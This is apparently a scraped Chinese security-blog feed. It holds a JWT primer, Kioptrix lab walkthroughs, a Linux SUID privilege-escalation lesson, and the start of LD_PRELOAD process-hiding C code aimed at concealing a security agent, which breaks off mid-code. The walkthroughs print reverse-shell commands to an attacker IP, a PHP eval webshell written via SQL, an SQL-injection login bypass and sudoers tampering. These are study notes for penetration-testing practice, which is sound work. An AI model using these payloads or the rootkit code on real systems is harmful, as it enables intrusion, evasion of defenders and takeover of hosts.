<h1 id="4-JWT长什么样？"><a href="#4-JWT长什么样？" class="headerlink" title="4.JWT长什么样？"></a>4.JWT长什么样？</h1><pre><code>JWT是由三段信息（header.payload.signature）构成的，将这三段信息文本用英文句号链接一起就构成了JWT字符串。例如：
</code></pre>
<p>eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiYWRtaW4iOnRydWV9.TJVA95OrM7E2cBab30RMHrHDcEfxjoYZgeFONFh7HgQ</p>
<pre><code>可以在 https://jwt.io/ 这个网站，把token解析出来。
</code></pre>
<h1 id="5-构成"><a href="#5-构成" class="headerlink" title="5.构成"></a>5.构成</h1><p>JWT的构成</p>
<pre><code>第一部分我们称它为头部（header)，

第二部分我们称其为承载（payload, 类似于飞机上承载的物品)，

第三部分是签证（signature)。
</code></pre>
<h2 id="5-1header"><a href="#5-1header" class="headerlink" title="5.1header"></a>5.1header</h2> <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">完整的头部就像下面这样的JSON：</span><br><span class="line"></span><br><span class="line">&#123;undefined</span><br><span class="line"></span><br><span class="line">  &#x27;typ&#x27;: &#x27;JWT&#x27;,</span><br><span class="line"></span><br><span class="line">  &#x27;alg&#x27;: &#x27;HS256&#x27;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">即声明 类型 和 加密的算法。然后将头部进行base64加密，就构成了header部分。</span><br></pre></td></tr></table></figure>

<h2 id="5-2playload"><a href="#5-2playload" class="headerlink" title="5.2playload"></a>5.2playload</h2><p>承载就是存放有效信息的地方。这个名字像是指飞机上承载的货品，这些有效信息包含三个部分声明（Claims）</p>
<pre><code>标准中注册的声明

公共的声明

私有的声明
</code></pre>
<p> 标准中注册的声明 (建议但不强制使用) ：</p>
<p>iss: jwt签发者</p>
<p>sub: jwt所面向的用户</p>
<p>aud: 接收jwt的一方</p>
<p>exp: jwt的过期时间，这个过期时间必须要大于签发时间</p>
<p>nbf: 定义在什么时间之前，该jwt都是不可用的.</p>
<p>iat: jwt的签发时间</p>
<p>jti: jwt的唯一身份标识，主要用来作为一次性token，从而回避重放攻击。</p>
<h2 id="5-3signature"><a href="#5-3signature" class="headerlink" title="5.3signature"></a>5.3signature</h2><p>signature是一个签证信息，它会用到前面的header、payload信息，以及一个密匙（secret）。</p>
<p>即，这个部分需要 base64加密后的header 和 base64加密后的payload，使用 英文句号 连接组成的字符串，然后通过header中声明的加密方式，进行加盐secret组合加密，然后就构成了jwt的第三部分signature。</p>
<h1 id="6-攻击思路"><a href="#6-攻击思路" class="headerlink" title="6.攻击思路"></a>6.攻击思路</h1><p>1.token的存储一般有两种方式，一种是存在localStorage中，二是存在cookie中，这两种存储方式都有问题，存在localStorage中有很大的安全隐患，容易造成XSS攻击，因为跨站脚本可以读取localStorage里面的信息，如果存在cookie中，又容易造成CSRF攻击，这个是由于Cookie存储的安全性造成的（可以使用XSRF Token来解决这个问题）。</p>
<p>2.失效和刷新问题，token肯定要有失效时间，而且如果用户一直处于活跃状态，则要考虑能自动刷新token。</p>
<p>3.重放攻击，由于每次都传输token，如果这个token被窃取，那么可以在任何一个地方使用。特别的，如果这个token过期时间很长的话，那么它就相当于一个在很长时间内有效的钥匙。（可以考虑每次请求都重新生成一个token并存储一段时间防重放，但是这样又会遇到存储问题和并发刷新的问题，参见：<a href="https://zhuanlan.zhihu.com/p/22693223%EF%BC%89">https://zhuanlan.zhihu.com/p/22693223）</a></p>
<p><a href="https://www.cnblogs.com/xiaozi/p/12031111.html">JWT攻击手册：如何入侵你的Token - Bypass - 博客园 (cnblogs.com)</a></p>
]]></content>
      <categories>
        <category>-basic</category>
      </categories>
  </entry>
  <entry>
    <title>KIOPTRIX: LEVEL 1.2 (#3)</title>
    <url>/2022/11/01/KIOPTRIX-LEVEL-1-2-3/</url>
    <content><![CDATA[<h1 id="KIOPTRIX-LEVEL-1-2-3"><a href="#KIOPTRIX-LEVEL-1-2-3" class="headerlink" title="KIOPTRIX: LEVEL 1.2 (#3)"></a>KIOPTRIX: LEVEL 1.2 (#3)</h1><h1 id="部署"><a href="#部署" class="headerlink" title="部署"></a>部署</h1><p>下载下来之后发现有个readme文件，需要我们修改本地的hosts文件才可以。</p>
<p><img src="/2022/11/01/KIOPTRIX-LEVEL-1-2-3/image-20221101161401477.png" alt="image-20221101161401477"></p>
<p><img src="/2022/11/01/KIOPTRIX-LEVEL-1-2-3/image-20221101162146121.png" alt="image-20221101162146121"></p>
<h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><p>刚刚部署的时候我扫过ip了</p>
<p>这次的ip地址是<code>192.168.100.152</code></p>
<p>那还是一样的操作，直接上nmap</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -A 192.168.100.152</span><br></pre></td></tr></table></figure>

<p>扫出来22和80</p>
<p>那直接访问进去看看</p>
<p>访问进去看看直接就是gallery CMS嘛，找一下相关漏洞的利用</p>
<p><img src="/2022/11/01/KIOPTRIX-LEVEL-1-2-3/image-20221101171609240.png" alt="image-20221101171609240"></p>
<p>找了一下，只有一个存储xss，我要这个有什么用？又登录不上靶机的后台（官方没给密码）</p>
<p>然后用dirb扫了下目录</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">dirb http://kioptrix3.com</span><br></pre></td></tr></table></figure>

<p>突然发现我最熟悉的phpmyadmin(#^.^#)</p>
<p><img src="/2022/11/01/KIOPTRIX-LEVEL-1-2-3/image-20221101172149849.png" alt="image-20221101172149849"></p>
<p>可惜没有密码，居然不是root</p>
<p>然后来到后台，指纹识别看看</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">whatweb http://kioptrix3.com/index.php?system=Admin</span><br></pre></td></tr></table></figure>

<p><img src="/2022/11/01/KIOPTRIX-LEVEL-1-2-3/image-20221101172918557.png" alt="image-20221101172918557"></p>
<p><img src="/2022/11/01/KIOPTRIX-LEVEL-1-2-3/image-20221101172911758.png" alt="image-20221101172911758"></p>
<h1 id="漏洞利用1-lotuscms-rce"><a href="#漏洞利用1-lotuscms-rce" class="headerlink" title="漏洞利用1-lotuscms-rce"></a>漏洞利用1-lotuscms-rce</h1><p>发现lotuscms</p>
<p>百度发现这么个东西</p>
<p><img src="/2022/11/01/KIOPTRIX-LEVEL-1-2-3/image-20221101173311076.png" alt="image-20221101173311076"></p>
<p>同时要是在kali上面搜索的话，也会发现有相关的利用</p>
<p><img src="/2022/11/01/KIOPTRIX-LEVEL-1-2-3/image-20221101173327066.png" alt="image-20221101173327066"></p>
<p>这是我百度出来的利用结果，那就直接利用一下</p>
<p><img src="/2022/11/01/KIOPTRIX-LEVEL-1-2-3/image-20221101173445479.png" alt="image-20221101173445479"></p>
<p><img src="/2022/11/01/KIOPTRIX-LEVEL-1-2-3/image-20221101173618356.png" alt="image-20221101173618356"></p>
<p>那还是直接弹一个nc回来</p>
<p>但是可以执行ls命令，却弹不了nc</p>
<p><img src="/2022/11/01/KIOPTRIX-LEVEL-1-2-3/image-20221101174939665.png" alt="image-20221101174939665"></p>
<p>dnslog也可以，说明命令执行是没有错的。</p>
<p>后来试了很多命令，发现最初的弹nc的命令并没有成功，这里我用的这个弹过来的。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nc -lvnp 6666 #攻击机</span><br><span class="line">nc -e sh 192.168.100.129 6666 #受害机</span><br></pre></td></tr></table></figure>

<h1 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h1><p><img src="/2022/11/01/KIOPTRIX-LEVEL-1-2-3/image-20221101175341698.png" alt="image-20221101175341698"></p>
<p>目前是网站的权限，但是之前我们扫到了phpmyadmin，那个应该就是root权限，我们直接去相对的目录下找到配置文件看密码就可以了。</p>
<p>在当前目录下的<code>gallery</code>下gconfig.php文件中有密码</p>
<p><img src="/2022/11/01/KIOPTRIX-LEVEL-1-2-3/image-20221101175751913.png" alt="image-20221101175751913"></p>
<p>密码是fuckeyou（不文明警告(#^.^#)</p>
<p>接下来就是登陆phpmyadmin，参考以前的博文</p>
<p><code>select &#39;&lt;?php @eval($_POST[a]);?&gt;&#39;INTO OUTFILE &#39;/home/www/kioptrix3.com/test.php&#39;</code></p>
<p>直接差一个webshell进去看看</p>
<p><img src="/2022/11/01/KIOPTRIX-LEVEL-1-2-3/image-20221101180821604.png" alt="image-20221101180821604"></p>
<p>结果也没有权限，这时候才想起去看sql中的数据表</p>
<p><img src="/2022/11/01/KIOPTRIX-LEVEL-1-2-3/image-20221101181412344.png" alt="image-20221101181412344"></p>
<p>有两个用户，之前22ssh服务打开的，可以用这两个用户去看看</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">dreg  Mast3r</span><br><span class="line">loneferret  starwars</span><br></pre></td></tr></table></figure>

<p><img src="/2022/11/01/KIOPTRIX-LEVEL-1-2-3/image-20221101182141573.png" alt="image-20221101182141573"></p>
<p>通过sudo -l命令发现loneferret账号可以执行哪些命令</p>
<p>如果当前用户拥有ht权限，那么可以通过修改命令文件的内容来进行提权</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">export TERM=xterm-color（将显示内容变成彩色</span><br><span class="line">sudo /usr/local/bin/ht</span><br><span class="line">f3</span><br><span class="line">/etc/sudoers</span><br></pre></td></tr></table></figure>

<p><img src="/2022/11/01/KIOPTRIX-LEVEL-1-2-3/image-20221101183320702.png" alt="image-20221101183320702"></p>
<p>在选中处添加,/bin/bash</p>
<p>F2保存，F10退出</p>
<p>此时再使用命令sudo提权至root权限</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo /bin/bash</span><br></pre></td></tr></table></figure>

<p><img src="/2022/11/01/KIOPTRIX-LEVEL-1-2-3/image-20221101183448920.png" alt="image-20221101183448920"></p>
<p><img src="/2022/11/01/KIOPTRIX-LEVEL-1-2-3/image-20221101183642895.png" alt="image-20221101183642895"></p>
<p>成功拿下权限！</p>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>也是先找ip，扫端口，进入web页面找nday，利用nday，ht提权。</p>
<p>宏观的讲就是信息收集，进机器，拿权限。</p>
]]></content>
      <categories>
        <category>-bachang</category>
      </categories>
  </entry>
  <entry>
    <title>KIOPTRIX: LEVEL 1.3 (#4)</title>
    <url>/2022/11/02/KIOPTRIX-LEVEL-1-3-4/</url>
    <content><![CDATA[<h1 id="KIOPTRIX-LEVEL-1-3-4"><a href="#KIOPTRIX-LEVEL-1-3-4" class="headerlink" title="KIOPTRIX: LEVEL 1.3 (#4)"></a>KIOPTRIX: LEVEL 1.3 (#4)</h1><h1 id="部署"><a href="#部署" class="headerlink" title="部署"></a>部署</h1><p>这个靶机有点特殊，需要新创建一个空的虚拟机，移除现在的硬盘，用靶机替换。</p>
<p><img src="/2022/11/02/KIOPTRIX-LEVEL-1-3-4/image-20221102121247513.png" alt="image-20221102121247513"></p>
<h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><p>打开靶场之后，同样的扫c段拿到靶机的地址。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap 192.168.100.0/24 -n -sP -sn</span><br></pre></td></tr></table></figure>

<p><img src="/2022/11/02/KIOPTRIX-LEVEL-1-3-4/image-20221102121830519.png" alt="image-20221102121830519"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">192.168.100.153</span><br></pre></td></tr></table></figure>

<p>然后扫端口</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -A 192.168.100.153</span><br></pre></td></tr></table></figure>

<p><img src="/2022/11/02/KIOPTRIX-LEVEL-1-3-4/image-20221102122018182.png" alt="image-20221102122018182"></p>
<p>22,80,139,445</p>
<h1 id="漏洞利用-sql"><a href="#漏洞利用-sql" class="headerlink" title="漏洞利用-sql"></a>漏洞利用-sql</h1><p>感觉有永恒之蓝，不过还是先照例访问一下80端口</p>
<p><img src="/2022/11/02/KIOPTRIX-LEVEL-1-3-4/image-20221102122246562.png" alt="image-20221102122246562"></p>
<p>一个登陆框，先扫一下目录，用下万能密码</p>
<p>万能密码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">admin&#x27; or 1=1#</span><br></pre></td></tr></table></figure>

<p><img src="/2022/11/02/KIOPTRIX-LEVEL-1-3-4/image-20221102122419294.png" alt="image-20221102122419294"></p>
<p>登陆之后说你的账户有问题，请联系本地administrator进行处理问题。</p>
<p><img src="/2022/11/02/KIOPTRIX-LEVEL-1-3-4/image-20221102122615367.png" alt="image-20221102122615367"></p>
<p>笑死，还发现一个反射型xss，不过万能密码这条路行不通了，扫目录发现这么个东西</p>
<p><img src="/2022/11/02/KIOPTRIX-LEVEL-1-3-4/image-20221102122735774.png" alt="image-20221102122735774"></p>
<p>也是有什么东西出错了</p>
<p><img src="/2022/11/02/KIOPTRIX-LEVEL-1-3-4/image-20221102122856132.png" alt="image-20221102122856132"></p>
<p>这里卡了半天，搜了下才知道要注意url，john，也就是指的这个用户为john我们需要先把admin的cookie清除掉，随后用万能密码登录john。</p>
<p><img src="/2022/11/02/KIOPTRIX-LEVEL-1-3-4/image-20221102123634806.png" alt="image-20221102123634806"></p>
<p>这样就可以去试试登录ssh了</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ssh john@192.168.100.153</span><br><span class="line">MyNameIsJohn</span><br></pre></td></tr></table></figure>

<p><img src="/2022/11/02/KIOPTRIX-LEVEL-1-3-4/image-20221102123929798.png" alt="image-20221102123929798"></p>
<p><img src="/2022/11/02/KIOPTRIX-LEVEL-1-3-4/image-20221102124049503.png" alt="image-20221102124049503"></p>
<p>但是没办法执行命令，于是百度了一下。</p>
<p>这里需要生成一个tty</p>
<p><a href="http://www.manongjc.com/detail/50-xutpevrxkczwyvh.html">如何将简单的Shell转换成为完全交互式的TTY - 码农教程 (manongjc.com)</a></p>
<p>又学到了。</p>
<p><img src="/2022/11/02/KIOPTRIX-LEVEL-1-3-4/image-20221102125407311.png" alt="image-20221102125407311"></p>
<h1 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h1><p>随后就是拿root权限</p>
<p>通过<code>lsb_release -a</code></p>
<p>拿到版本信息，然后在exp的网站上面找一个提权脚本下载下来。</p>
<p><img src="/2022/11/02/KIOPTRIX-LEVEL-1-3-4/image-20221102125839075.png" alt="image-20221102125839075"></p>
<p>但是我发现脚本怎么都传不过去啊。</p>
<p>我觉得是这个tty的问题，我发执行长期返回的命令。</p>
<p>所以，求助了一下攻略，这里使用的是mysqludf提权</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd /var/www/</span><br><span class="line">cat checklogin.php</span><br></pre></td></tr></table></figure>

<p>可以看到root用户是空密码</p>
<p><img src="/2022/11/02/KIOPTRIX-LEVEL-1-3-4/image-20221102131631523.png" alt="image-20221102131631523"></p>
<p>我们可以通过mysql服务登录root账户</p>
<p><img src="/2022/11/02/KIOPTRIX-LEVEL-1-3-4/image-20221102131840802.png" alt="image-20221102131840802"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql -u root -p</span><br></pre></td></tr></table></figure>

<p><img src="/2022/11/02/KIOPTRIX-LEVEL-1-3-4/image-20221102132807319.png" alt="image-20221102132807319"></p>
<p><img src="/2022/11/02/KIOPTRIX-LEVEL-1-3-4/image-20221102133216681.png" alt="image-20221102133216681"></p>
<p>查询UDF表，有sys_exec函数，可以利用这个函数执行系统命令。通过sys_exec函数将john添加到管理员组。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select sys_exec(&#x27;usermod -a -G admin john&#x27;);</span><br><span class="line">exit</span><br><span class="line">sudo su</span><br></pre></td></tr></table></figure>

<p><img src="/2022/11/02/KIOPTRIX-LEVEL-1-3-4/image-20221102133345010.png" alt="image-20221102133345010"></p>
<p>拿下</p>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>提权并不能完全依赖系统的提权脚本，也可以通过其他手段，比如最常见的mysqludf提权。</p>
]]></content>
      <categories>
        <category>-bachang</category>
      </categories>
  </entry>
  <entry>
    <title>Kioptrix: Level 1</title>
    <url>/2022/11/01/Kioptrix-Level-1/</url>
    <content><![CDATA[<h1 id="Kioptrix-Level-1"><a href="#Kioptrix-Level-1" class="headerlink" title="Kioptrix: Level 1"></a>Kioptrix: Level 1</h1><p>最近要开始备战OSCP了，所以专门开了个分区存放我的打靶机心路。</p>
<h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><p>首先要给靶机开启nat模式，如果还是扫不到，需要进入虚拟机文件中的vmx文件中将所有的bridge改为nat，才扫得到。</p>
<p>开启靶机之后首先上kali拿到目标靶机的ip地址，使用nmap扫c段。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap 192.168.100.0/24 -n -sP -sn</span><br></pre></td></tr></table></figure>

<p>拿到靶机的地址为192.168.100.150</p>
<p><img src="/2022/11/01/Kioptrix-Level-1/image-20221101125154578.png" alt="image-20221101125154578"></p>
<p>随后扫全端口</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -A 192.168.100.150</span><br></pre></td></tr></table></figure>

<p>扫描到的端口有，22,80,111,139,443，1024端口</p>
<p><img src="/2022/11/01/Kioptrix-Level-1/image-20221101130014208.png" alt="image-20221101130014208"></p>
<h1 id="漏洞探测"><a href="#漏洞探测" class="headerlink" title="漏洞探测"></a>漏洞探测</h1><p>首先扫一扫目录</p>
<p>由于oscp偏向于使用kail，我这里也用kali里面的工具进行扫描。</p>
<p>用的nikto</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nikto -h 192.168.100.150</span><br></pre></td></tr></table></figure>

<p><img src="/2022/11/01/Kioptrix-Level-1/image-20221101132111365.png" alt="image-20221101132111365"></p>
<p>拿到一些中间件信息和网站目录</p>
<p>使用kali里面搜索利用工具的命令，<code>searchsploit apache 1.3.20</code></p>
<p><img src="/2022/11/01/Kioptrix-Level-1/image-20221101132352327.png" alt="image-20221101132352327"></p>
<p>科普：Apache 和 mod_SSL是包含用于SSL的额外模块的Apache服务器</p>
<p>在利用的exp中，发现了我们扫出来的mod_ssl版本，</p>
<p><img src="/2022/11/01/Kioptrix-Level-1/image-20221101132748772.png" alt="image-20221101132748772"></p>
<p><img src="/2022/11/01/Kioptrix-Level-1/image-20221101132756892.png" alt="image-20221101132756892"></p>
<p>定位到该脚本存放的目录</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">locate 764.c</span><br><span class="line">cd /usr/share/exploitdb/exploits/unix/remote/</span><br></pre></td></tr></table></figure>

<p>将他拷贝到桌面上</p>
<p>要使用这个脚本需要安装相关环境</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo apt-get install libssl1.0-dev</span><br></pre></td></tr></table></figure>

<h1 id="漏洞利用1-Apache"><a href="#漏洞利用1-Apache" class="headerlink" title="漏洞利用1-Apache"></a>漏洞利用1-Apache</h1><p>首先我们需要修改脚本中的一些内容</p>
<p>1.在头文件添加</p>
<p><code>#include &lt;openssl/rc4.h&gt; #include &lt;openssl/md5.h&gt;</code></p>
<p>2.将#define COMMAND2，wget后面的URL修改为<code>https://dl.packetstormsecurity.net/0304-exploits/ptrace-kmod.c;</code></p>
<p>3.将unsigned char *p, *end前添加const</p>
<p>最后在kali上成功编译</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">gcc -o okk 764.c -lcrypto</span><br></pre></td></tr></table></figure>

<p>随后执行<code>./okk 0x6b 192.168.100.150 -c 40</code></p>
<p>我人麻了啊，什么都是照着做的</p>
<p><img src="/2022/11/01/Kioptrix-Level-1/image-20221101140209884.png" alt="image-20221101140209884"></p>
<p>就我的报错是吧，拿不到root权限。</p>
<p>不过不用担心，这里还有另外一种方式拿到root权限。</p>
<h1 id="漏洞利用2-Samba"><a href="#漏洞利用2-Samba" class="headerlink" title="漏洞利用2-Samba"></a>漏洞利用2-Samba</h1><p>科普：<em>Samba</em>是在Linux和UNIX系统上实现SMB协议的一个免费软件，由服务器及客户端程序构成</p>
<p>在信息收集的时候发现了主机装了samba，版本为Samba2.2.1a</p>
<p>使用msf搜索samba</p>
<p><code>search Samba</code></p>
<p><img src="/2022/11/01/Kioptrix-Level-1/image-20221101140539118.png" alt="image-20221101140539118"></p>
<p>用这个</p>
<p>设置好目标ip地址和荷载<code>linux/x86/shell_bind_tcp </code>之后直接run就可以了，要先设置荷载</p>
<p><img src="/2022/11/01/Kioptrix-Level-1/image-20221101141247508.png" alt="image-20221101141247508"></p>
<p>这样成功拿到对面root权限。</p>
<h1 id="nc"><a href="#nc" class="headerlink" title="nc"></a>nc</h1><p>攻击机执行</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nc -lvnp 9001</span><br></pre></td></tr></table></figure>

<p>受害机执行</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sh -i &gt;&amp; /dev/tcp/192.168.100.129/9001 0&gt;&amp;1</span><br></pre></td></tr></table></figure>

<p><img src="/2022/11/01/Kioptrix-Level-1/image-20221101141823823.png" alt="image-20221101141823823"></p>
<p>成功连接</p>
<p><img src="/2022/11/01/Kioptrix-Level-1/image-20221101141835450.png" alt="image-20221101141835450"></p>
<p>成功拿下这个靶机</p>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>主要来说第一次接触这种靶机，对于kali的命令使用也不太熟练，稍后会进行一系列的总结。</p>
<p>这次的思路的话，也就是扫端口，探测目标中间件版本或者系统版本，版本漏洞利用。</p>
]]></content>
      <categories>
        <category>-bachang</category>
      </categories>
  </entry>
  <entry>
    <title>Linux suid提权漏洞</title>
    <url>/2022/08/14/Linux-suid%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E/</url>
    <content><![CDATA[<h1 id="Linux-suid提权漏洞"><a href="#Linux-suid提权漏洞" class="headerlink" title="Linux suid提权漏洞"></a>Linux suid提权漏洞</h1><p>一、课时目标<br>1.理解suid的概念和作用<br>2.掌握linux suid提权的方法</p>
<p>二、思考<br>思考： shadow文件存放用户密码，那普通用户在没有写权限的情况下如何修改密码并更新shadow文件中的内容？</p>
<p><img src="/2022/08/14/Linux-suid%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E/7ff21abfdd6043ffb0bb6a53181891f4.png" alt="在这里插入图片描述"></p>
<p>我们知道，系统中的用户密码是保存在/etc/shadow中的，普通用户可以修改自己的密码，修改完成后shadows文件中的密码也会随之更新。<br>回顾linux下文件权限，用户具备w写权限才能对文件内容进行修改，但明显普通用户对于shadow文件没有任何操作权限，那这个过程是如何发生的呢？原因就在于这个SUID功能，也就是passwd文件拥有者的x权限上出现的S标志。</p>
<p><img src="/2022/08/14/Linux-suid%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E/9234e042864949f99b4e66ee5533d0b3.png" alt="在这里插入图片描述"></p>
<p>三、什么是SUID<br>SUID是一种对二进制程序进行设置的特殊权限,可以让二进制程序的执行者临时拥有属主的权限<br>当s这个标志出现在文件所有者的x权限上时，如/usr/bin/passwd这个文件的权限状态：“-rwsr-xr-x.”，此时就被称为Set UID，简称为SUID。那么这个特殊权限的特殊性的作用是什么呢？<br>1、SUID权限仅对二进制程序(binary program)有效；<br>2、执行者对于该程序需要具有x的可执行权限；<br>3、本权限仅在执行该程序的过程中有效(run-time)；<br>4、执行者将具有该程序拥有者(owner)的权限。</p>
<p>SUID的目的就是：让本来没有相应权限的用户运行这个程序时，可以访问他没有权限访问的资源。</p>
<p>passwd就是一个很鲜明的例子，下面我们就来了解一下这相passwd执行的过程。<br>1、因为/usr/bin/passwd的权限对任何的用户都是可以执行的，所以系统中每个用户都可以执行此命令。<br>2、而/usr/bin/passwd这个文件的权限是属于root的。<br>3、当某个用户执行/usr/bin/passwd命令的时候，就拥有了root的权限了。<br>4、于是某个用户就可以借助root用户的权力，来修改了/etc/shadow文件了。<br>5、最后，把密码修改成功。<br>注：这个SUID只能运行在二进制的程序上（系统中的一些命令），不能用在脚本上（script），因为脚本还是把很多的程序集合到一起来执行，而不是脚本自身在执行。同样，这个SUID也不能放到目录上，放上也是无效的。</p>
<p>四、如何设置suid<br>1.为find命令添加s位权限<br>chmod u+s /usr/find</p>
<p><img src="/2022/08/14/Linux-suid%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E/1.png" alt="在这里插入图片描述"></p>
<p>五、suid提权<br>常见可以用来提权的程序有：nmap、vim、find、bash、more、less、nano、cp</p>
<p>SUID文件在执行的时候以属主的身份执行，因此拿到了root的权限，若是对一些特殊命令设置了SUID，那么就会有被利用提权的可能性，常用的SUID提权命令有nmap，vim，find，bash，more，less，nano以及cp等等。</p>
<p>以下语句可以用来搜索具备SUID权限的程序</p>
<p><code>find / -perm -u=s -type f 2&gt;/dev/null</code></p>
<p><code>find / -user root -perm -4000 -exec ls -ldb &#123;&#125; ;</code></p>
<p><code>find / -user root -perm -4000 -print 2&gt;/dev/null</code></p>
<p>举例：使用find命令进行提权<br>find 1.txt -exec whoami ;<br>find 1.txt -exec /bin/bash -p ;</p>
<p><img src="/2022/08/14/Linux-suid%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E/2.png" alt="在这里插入图片描述"></p>
<h1 id="靶场实例"><a href="#靶场实例" class="headerlink" title="靶场实例"></a>靶场实例</h1><p>首先是拿到了一个主机的meterpreter</p>
<p>使用以下命令找一下具有suid权限的程序</p>
<p><code>find / -perm -u=s -type f 2&gt;/dev/null</code></p>
<p><img src="/2022/08/14/Linux-suid%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E/image-20220814145141549.png" alt="image-20220814145141549"></p>
<p>tips：上一步中，如果要直接显示文件的权限，可以使用以下命令</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">find / -user root -perm -4000 -type f 2&gt;/dev/null -exec ls -l &#123;&#125; \;</span><br></pre></td></tr></table></figure>

<p>进入目录，直接执行，拿到权限</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd /home/user3</span><br><span class="line">./shell</span><br></pre></td></tr></table></figure>

<p><img src="/2022/08/14/Linux-suid%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E/image-20220814145618134.png" alt="image-20220814145618134"></p>
<p><a href="https://blog.csdn.net/weixin_39430198/article/details/123504153">借鉴：(95条消息) 一文让你深刻理解什么是suid提权_Nddey的博客-CSDN博客_suid提权</a></p>
]]></content>
      <categories>
        <category>-fuxian</category>
      </categories>
  </entry>
  <entry>
    <title>Linux进程隐藏-劫持预加载动态链接库LD_PRELOAD</title>
    <url>/2023/07/18/Linux%E8%BF%9B%E7%A8%8B%E9%9A%90%E8%97%8F-%E5%8A%AB%E6%8C%81%E9%A2%84%E5%8A%A0%E8%BD%BD%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5%E5%BA%93LD-PRELOAD/</url>
    <content><![CDATA[<h1 id="Linux进程隐藏-劫持预加载动态链接库LD-PRELOAD"><a href="#Linux进程隐藏-劫持预加载动态链接库LD-PRELOAD" class="headerlink" title="Linux进程隐藏-劫持预加载动态链接库LD_PRELOAD"></a>Linux进程隐藏-劫持预加载动态链接库LD_PRELOAD</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ps/top 命令就是在不断的读取/proc/pid 下的文件信息，再显示出来给我看；</span><br><span class="line"></span><br><span class="line">一般先调用 stat() 确认文件状态，再调用 openat() 打开文件句柄，然后 read() 读取内容，最后 close() 关闭；不断重复这一系列动作从而获取进程信息；</span><br><span class="line"></span><br><span class="line">当然这些都是系统调用，并不是 ps 源码中直接调用的，ps 源码直接调用的函数其实是opendir以及readdir，readdir 内部再进行以上这些系统调用。</span><br></pre></td></tr></table></figure>

<p><strong>劫持预加载动态链接库 LD_PRELOAD</strong></p>
<p>脚本如下</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;dlfcn.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;dirent.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Every process with this name will be excluded</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">const</span> <span class="keyword">char</span>* process_to_filter = <span class="string">&quot;YDService&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Get a directory name given a DIR* handle</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">get_dir_name</span><span class="params">(DIR* dirp, <span class="keyword">char</span>* buf, <span class="keyword">size_t</span> size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> fd = dirfd(dirp);</span><br><span class="line">    <span class="keyword">if</span>(fd == <span class="number">-1</span>) &#123;</span><br><span 